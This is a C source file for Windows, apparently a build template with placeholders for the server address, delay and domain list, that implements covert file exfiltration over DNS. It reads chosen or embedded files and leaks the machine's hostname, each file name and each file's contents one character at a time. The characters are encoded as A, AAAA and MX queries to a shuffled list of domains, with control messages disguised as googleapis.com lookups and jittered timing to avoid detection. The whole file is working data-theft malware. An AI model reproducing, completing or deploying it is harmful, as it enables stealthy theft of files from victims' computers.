#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")

#define SERVER_HOST "{{SERVER_HOST}}"
#define SERVER_PORT {{SERVER_PORT}}
#define BASE_DELAY  {{DELAY}}
#define BASE_JITTER {{JITTER}}

static const char *CTRL_DOMAIN = "googleapis.com";

static const char *DOMAINS[] = {
{{DOMAINS_C_ARRAY}}
};
#define NUM_DOMAINS (sizeof(DOMAINS) / sizeof(DOMAINS[0]))

static const char *EMBEDDED_FILES[] = {{EMBEDDED_FILES_INIT}};
static int EMBEDDED_COUNT = {{EMBEDDED_FILES_COUNT}};

#define QTYPE_A    1
#define QTYPE_MX   15
#define QTYPE_AAAA 28

#define CTRL_START     0
#define CTRL_END_HOST  1
#define CTRL_END_FILE  2
#define CTRL_END_DATA  3
#define CTRL_CHUNK_OFF 3

#define NUM_CHARS 98

static char ALL_CHARS[NUM_CHARS];
static const char *char_to_domain[256];
static SOCKET g_sock;
static struct sockaddr_in g_server;

static void init_chars(void) {
    int idx = 0;
    for (int i = 32; i <= 126; i++)
        ALL_CHARS[idx++] = (char)i;
    ALL_CHARS[idx++] = '\n';
    ALL_CHARS[idx++] = '\t';
    ALL_CHARS[idx++] = '\r';
}

static unsigned int xorshift32(unsigned int s) {
    s ^= s << 13;
    s ^= s >> 17;
    s ^= s << 5;
    return s;
}

static void build_mapping(unsigned int seed) {
    int perm[NUM_CHARS];
    int i;
    for (i = 0; i < NUM_CHARS; i++)
        perm[i] = i;
    unsigned int state = seed;
    if (state == 0)
        state = 1;
    for (i = NUM_CHARS - 1; i > 0; i--) {
        state = xorshift32(state);
        int j = state % (i + 1);
        int tmp = perm[i];
        perm[i] = perm[j];
        perm[j] = tmp;
    }
    memset(char_to_domain, 0, sizeof(char_to_domain));
    for (i = 0; i < NUM_CHARS; i++)
        char_to_domain[(unsigned char)ALL_CHARS[i]] = DOMAINS[perm[i]];
}

static int encode_domain(const char *domain, unsigned char *buf) {
    int pos = 0;
    const char *p = domain;
    while (*p) {
        const char *dot = strchr(p, '.');
        int len = dot ? (int)(dot - p) : (int)strlen(p);
        buf[pos++] = (unsigned char)len;
        memcpy(buf + pos, p, len);
        pos += len;
        if (dot) p = dot + 1;
        else break;
    }
    buf[pos++] = 0;
    return pos;
}

static int build_query(unsigned short txid, const char *domain,
                       unsigned short qtype, unsigned char *buf) {
    buf[0] = txid >> 8;
    buf[1] = txid & 0xFF;
    buf[2] = 0x01; buf[3] = 0x00;
    buf[4] = 0; buf[5] = 1;
    buf[6] = buf[7] = buf[8] = buf[9] = buf[10] = buf[11] = 0;
    int pos = 12;
    pos += encode_domain(domain, buf + pos);
    buf[pos++] = qtype >> 8;
    buf[pos++] = qtype & 0xFF;
    buf[pos++] = 0;
    buf[pos++] = 1;
    return pos;
}

static int parse_a_record(const unsigned char *data, int len,
                          unsigned char ip[4]) {
    if (len < 12) return 0;
    int ancount = (data[6] << 8) | data[7];
    if (ancount < 1) return 0;
    int off = 12;
    while (off < len && data[off] != 0)
        off += 1 + data[off];
    off += 5;
    if (off + 2 > len) return 0;
    if ((data[off] & 0xC0) == 0xC0)
        off += 2;
    else {
        while (off < len && data[off] != 0)
            off += 1 + data[off];
        off++;
    }
    if (off + 10 > len) return 0;
    int rtype = (data[off] << 8) | data[off + 1];
    off += 8;
    int rdlen = (data[off] << 8) | data[off + 1];
    off += 2;
    if (rtype == 1 && rdlen == 4 && off + 4 <= len) {
        memcpy(ip, data + off, 4);
        return 1;
    }
    return 0;
}

static unsigned short encode_txid(int cid, int seq) {
    return (unsigned short)(((cid & 0xFF) << 8) | (seq & 0xFF));
}

static int dns_send(unsigned short txid, const char *domain,
                    unsigned short qtype, unsigned char *resp, int rsz) {
    unsigned char pkt[512];
    int plen = build_query(txid, domain, qtype, pkt);
    sendto(g_sock, (const char *)pkt, plen, 0,
           (struct sockaddr *)&g_server, sizeof(g_server));
    int timeout = 2000;
    setsockopt(g_sock, SOL_SOCKET, SO_RCVTIMEO,
               (const char *)&timeout, sizeof(timeout));
    int n = recvfrom(g_sock, (char *)resp, rsz, 0, NULL, NULL);
    return n > 0 ? n : 0;
}

static int send_ctrl(int cid, int seq, unsigned char *resp, int rsz) {
    return dns_send(encode_txid(cid, seq), CTRL_DOMAIN, QTYPE_A, resp, rsz);
}

static void jitter_sleep(void) {
    int d = BASE_DELAY;
    if (BASE_JITTER > 0)
        d += (rand() % (2 * BASE_JITTER + 1)) - BASE_JITTER;
    if (d > 0) Sleep(d);
}

static void send_phase(int cid, const char *text, int tlen,
                       unsigned short qtype) {
    int seq = 0, chunk = 0;
    unsigned char resp[512];
    for (int i = 0; i < tlen; i++) {
        const char *dom = char_to_domain[(unsigned char)text[i]];
        if (!dom) continue;
        dns_send(encode_txid(cid, seq), dom, qtype, resp, sizeof(resp));
        seq++;
        if (seq > 255) {
            chunk++;
            send_ctrl(cid, CTRL_CHUNK_OFF + chunk, resp, sizeof(resp));
            seq = 0;
        }
        jitter_sleep();
    }
}

static char *read_file(const char *path, int *out_len) {
    FILE *f = fopen(path, "rb");
    if (!f) return NULL;
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    char *buf = (char *)malloc(sz + 1);
    if (!buf) { fclose(f); return NULL; }
    *out_len = (int)fread(buf, 1, sz, f);
    buf[*out_len] = 0;
    fclose(f);
    return buf;
}

static void exfil(const char *filepath) {
    int clen = 0;
    char *content = read_file(filepath, &clen);
    if (!content) return;

    char hostname[256] = {0};
    DWORD hsz = sizeof(hostname);
    GetComputerNameA(hostname, &hsz);

    const char *fname = strrchr(filepath, '\\');
    if (!fname) fname = strrchr(filepath, '/');
    fname = fname ? fname + 1 : filepath;

    int cid = rand() % 255 + 1;
    unsigned char resp[512];

    int n = send_ctrl(cid, CTRL_START, resp, sizeof(resp));
    if (n == 0) { free(content); return; }
    unsigned char ip[4];
    if (!parse_a_record(resp, n, ip)) { free(content); return; }
    unsigned int seed = ((unsigned int)ip[0] << 24) |
                        ((unsigned int)ip[1] << 16) |
                        ((unsigned int)ip[2] << 8) | ip[3];
    build_mapping(seed);
    jitter_sleep();

    send_phase(cid, hostname, (int)strlen(hostname), QTYPE_AAAA);
    send_ctrl(cid, CTRL_END_HOST, resp, sizeof(resp));
    jitter_sleep();

    send_phase(cid, fname, (int)strlen(fname), QTYPE_MX);
    send_ctrl(cid, CTRL_END_FILE, resp, sizeof(resp));
    jitter_sleep();

    send_phase(cid, content, clen, QTYPE_A);
    send_ctrl(cid, CTRL_END_DATA, resp, sizeof(resp));
    free(content);
}

int main(int argc, char **argv) {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
    srand((unsigned int)GetTickCount());
    init_chars();

    g_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    memset(&g_server, 0, sizeof(g_server));
    g_server.sin_family = AF_INET;
    g_server.sin_port = htons(SERVER_PORT);
    g_server.sin_addr.s_addr = inet_addr(SERVER_HOST);

    const char **files;
    int fcount;
    if (argc > 1) {
        files = (const char **)(argv + 1);
        fcount = argc - 1;
    } else if (EMBEDDED_COUNT > 0) {
        files = EMBEDDED_FILES;
        fcount = EMBEDDED_COUNT;
    } else {
        closesocket(g_sock);
        WSACleanup();
        return 1;
    }

    int i;
    for (i = 0; i < fcount; i++)
        exfil(files[i]);

    closesocket(g_sock);
    WSACleanup();
    return 0;
}
